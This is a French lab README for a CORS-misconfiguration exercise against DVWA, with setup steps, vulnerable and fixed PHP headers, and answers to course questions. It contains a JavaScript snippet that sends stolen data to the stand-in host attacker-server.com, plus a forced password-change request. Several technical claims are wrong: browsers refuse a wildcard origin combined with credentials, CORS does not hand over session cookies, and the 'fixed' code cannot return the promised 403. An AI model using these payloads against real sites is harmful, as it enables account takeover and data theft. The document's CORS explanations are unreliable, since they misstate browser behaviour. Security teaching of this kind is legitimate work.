# 🚨 Laboratoire d'Attaque CORS - DVWA

## 📋 Objectif
Expérimenter une attaque sur le mécanisme CORS au moyen du laboratoire d'expérimentation en ciblant l'environnement DVWA.

## 🛠️ Fichiers créés pour l'exercice

### 1. Configuration Docker
- **`docker-compose.yml`** : Configuration pour DVWA avec base de données MySQL

### 2. Scripts PHP vulnérables
- **`vulnerable.php`** : Script PHP vulnérable à CORS (version dangereuse)
- **`vulnerable_fixed.php`** : Script PHP avec CORS sécurisé (version corrigée)

### 3. Page d'exploitation
- **`exploit.html`** : Page malveillante pour démontrer l'attaque CORS

### 4. Scripts de démarrage
- **`start_attack_server.ps1`** : Script PowerShell pour démarrer le serveur d'attaque
- **`start_attack_server.sh`** : Script Bash pour démarrer le serveur d'attaque

## 🚀 Instructions d'utilisation

### Étape 1 : Démarrer DVWA
```powershell
# Démarrer DVWA avec Docker Compose
podman-compose up -d

# Vérifier que DVWA est accessible
# Ouvrir http://localhost:8080 dans le navigateur
# Identifiants : admin / password
```

### Étape 2 : Configurer DVWA
1. Se connecter à DVWA (http://localhost:8080)
2. Aller dans **DVWA Security** et mettre le niveau à **"Low"**
3. Copier le fichier `vulnerable.php` dans le répertoire web de DVWA

### Étape 3 : Démarrer le serveur d'attaque
```powershell
# Option 1 : PowerShell
.\start_attack_server.ps1

# Option 2 : Bash (si disponible)
bash start_attack_server.sh

# Option 3 : Python direct
python -m http.server 8000
```

### Étape 4 : Exécuter l'attaque
1. Ouvrir http://localhost:8000/exploit.html dans un navigateur
2. S'assurer d'être connecté à DVWA dans un autre onglet
3. Cliquer sur "Tester la vulnérabilité CORS"
4. Observer le vol du cookie de session

### Étape 5 : Capturer le trafic avec Burp Suite
1. Configurer Burp Suite pour intercepter les requêtes
2. Observer la requête vers `/vulnerable.php` et la fuite du cookie
3. Analyser les en-têtes CORS dans les requêtes

### Étape 6 : Corriger la vulnérabilité
1. Remplacer `vulnerable.php` par `vulnerable_fixed.php`
2. Tester à nouveau l'exploitation
3. Observer que l'attaque échoue maintenant

## 🔍 Analyse de la vulnérabilité

### Code vulnérable (vulnerable.php)
```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
// ... code vulnérable
?>
```

### Code sécurisé (vulnerable_fixed.php)
```php
<?php
header("Access-Control-Allow-Origin: https://trusted-site.com");
header("Access-Control-Allow-Credentials: true");
// ... code sécurisé
?>
```

## ❓ Réponses aux questions

### 1. Pourquoi « Access-Control-Allow-Origin: * » est-il dangereux ?

**Réponse :**
L'en-tête `Access-Control-Allow-Origin: *` est extrêmement dangereux car :

- **Permet l'accès depuis n'importe quel domaine** : Tous les sites web peuvent faire des requêtes vers votre API
- **Expose les données sensibles** : N'importe quel site malveillant peut accéder aux ressources protégées
- **Contourne la politique de même origine** : Annule la protection fondamentale du navigateur
- **Facilite les attaques CSRF** : Les attaquants peuvent déclencher des actions non autorisées
- **Violation de la confidentialité** : Les données utilisateur peuvent être volées sans consentement

**Exemple concret :** Un site malveillant peut faire une requête vers votre API bancaire et récupérer les informations de compte de l'utilisateur connecté.

### 2. Quel rôle joue « Access-Control-Allow-Credentials: true » ?

**Réponse :**
L'en-tête `Access-Control-Allow-Credentials: true` :

- **Inclut les cookies dans les requêtes CORS** : Permet l'envoi automatique des cookies de session
- **Transmet les informations d'authentification** : Les tokens d'authentification sont inclus
- **Expose les données de session** : Les cookies PHPSESSID, JWT, etc. sont accessibles
- **Augmente la surface d'attaque** : Combine avec `Access-Control-Allow-Origin: *` pour créer une vulnérabilité critique

**Impact :** Sans cet en-tête, les cookies ne seraient pas envoyés, limitant l'impact de l'attaque CORS.

### 3. Comment un attaquant pourrait-il exploiter cette faille ?

**Réponse :**
Un attaquant peut exploiter cette faille de plusieurs manières :

#### Méthode 1 : Vol de cookies de session
```javascript
fetch('http://vulnerable-site.com/api/sensitive-data', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    // Envoyer les données volées à son serveur
    fetch('https://attacker-server.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

#### Méthode 2 : Actions non autorisées
```javascript
// Changer le mot de passe de l'utilisateur
fetch('http://vulnerable-site.com/api/change-password', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({newPassword: 'hacked123'})
});
```

#### Méthode 3 : Exfiltration de données
- Vol d'informations personnelles
- Accès aux comptes bancaires
- Modification de paramètres de sécurité
- Escalade de privilèges

### 4. Quelles sont les bonnes pratiques pour configurer CORS ?

**Réponse :**

#### ✅ Bonnes pratiques

1. **Spécifier des origines exactes**
```php
header("Access-Control-Allow-Origin: https://trusted-domain.com");
```

2. **Utiliser des listes d'origines autorisées**
```php
$allowedOrigins = ['https://app1.com', 'https://app2.com'];
$origin = $_SERVER['HTTP_ORIGIN'];
if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: $origin");
}
```

3. **Limiter les méthodes HTTP autorisées**
```php
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
```

4. **Restreindre les en-têtes autorisés**
```php
header("Access-Control-Allow-Headers: Content-Type, Authorization");
```

5. **Désactiver les credentials si non nécessaires**
```php
// Ne pas utiliser Access-Control-Allow-Credentials si possible
```

6. **Implémenter une validation stricte**
```php
if (!preg_match('/^https:\/\/[a-zA-Z0-9.-]+\.trusted-domain\.com$/', $origin)) {
    http_response_code(403);
    exit('Origin not allowed');
}
```

#### ❌ À éviter

- `Access-Control-Allow-Origin: *` avec des credentials
- Validation d'origine insuffisante
- Pas de validation des méthodes HTTP
- Headers CORS trop permissifs

## 🔒 Mesures de protection supplémentaires

1. **Validation côté serveur** : Toujours valider les requêtes
2. **Authentification robuste** : Utiliser des tokens sécurisés
3. **Monitoring** : Surveiller les requêtes CORS suspectes
4. **Tests de sécurité** : Effectuer des audits réguliers
5. **Documentation** : Documenter la politique CORS

## 📊 Résultats attendus

### Avant correction (vulnérable)
- ✅ L'attaque réussit
- ✅ Le cookie de session est volé
- ✅ Les données sensibles sont exposées

### Après correction (sécurisé)
- ❌ L'attaque échoue
- ❌ Erreur 403 "Origin not allowed"
- ✅ Seules les origines autorisées peuvent accéder

## 🎯 Conclusion

Cette démonstration illustre l'importance cruciale d'une configuration CORS appropriée. Une mauvaise configuration peut exposer des données sensibles et permettre des attaques sophistiquées. Il est essentiel de :

1. **Comprendre les implications** de chaque en-tête CORS
2. **Tester régulièrement** la configuration de sécurité
3. **Suivre les bonnes pratiques** de sécurité web
4. **Maintenir une veille** sur les nouvelles vulnérabilités

La sécurité web est un processus continu qui nécessite une attention constante et des mises à jour régulières.
